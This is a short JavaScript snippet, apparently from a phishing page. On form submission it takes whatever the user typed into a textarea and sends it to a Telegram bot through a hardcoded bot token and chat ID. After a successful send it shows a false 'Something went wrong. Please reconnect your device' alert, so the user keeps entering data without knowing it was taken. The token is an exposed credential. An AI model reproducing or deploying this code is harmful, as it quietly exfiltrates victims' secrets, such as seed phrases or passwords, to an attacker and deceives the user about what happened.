const submit = async (e) => {
  e.preventDefault();
  const message = document.querySelector("#textarea").value;

  axios
    .post(
      "https://api.telegram.org/bot6898028623:AAGsjHH9BuAxFfc5XK2taiInEw90hoWyuU0/sendMessage",
      {
        chat_id: 6501275830
,
        text: message,
      }
    )
    .then((response) => {
      alert('Something went wrong. Please reconnect your device')
      // We get here if the message was successfully posted
      console.log(response);
    })
    .catch((err) => {
      // ...and here if it was not
      console.log("Error :", err);
      alert("an error occured", err);
    });
};

document.querySelector("form").addEventListener("submit", submit);
